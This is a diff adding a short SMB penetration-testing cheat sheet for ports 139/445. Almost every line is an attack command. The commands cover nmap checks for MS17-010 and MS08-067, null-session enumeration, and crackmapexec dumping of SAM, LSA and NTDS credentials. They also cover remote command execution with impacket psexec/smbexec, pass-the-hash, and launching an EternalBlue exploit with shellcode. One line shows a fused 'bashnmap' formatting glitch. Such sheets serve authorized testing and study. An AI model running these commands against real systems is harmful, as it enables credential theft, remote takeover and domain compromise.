@@ -1,0 +1,29 @@
+PORT 139/445 — SMB
+bashnmap --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010,smb-vuln-ms08-067 -p 445 target
+crackmapexec smb DC_IP -u '' -p ''
+crackmapexec smb DC_IP -u 'guest' -p ''
+
+# Null session enum
+smbclient -L //DC_IP -N
+enum4linux-ng -A DC_IP
+smbmap -H DC_IP
+
+# Authenticated
+crackmapexec smb DC_IP -u user -p pass --shares
+crackmapexec smb DC_IP -u user -p pass --users
+crackmapexec smb DC_IP -u user -p pass --groups
+crackmapexec smb DC_IP -u user -p pass --sam
+crackmapexec smb DC_IP -u user -p pass --lsa
+crackmapexec smb DC_IP -u user -p pass --ntds   # if DA
+
+# RCE
+impacket-psexec user:pass@target
+impacket-smbexec user:pass@target
+crackmapexec smb target -u user -p pass -x "whoami"
+
+# Pass the hash
+impacket-psexec -hashes :NTLM admin@target
+crackmapexec smb target -u admin -H NTLM_HASH -x "whoami"
+
+# EternalBlue
+python3 eternalblue_exploit7.py target shellcode/sc_x64.bin
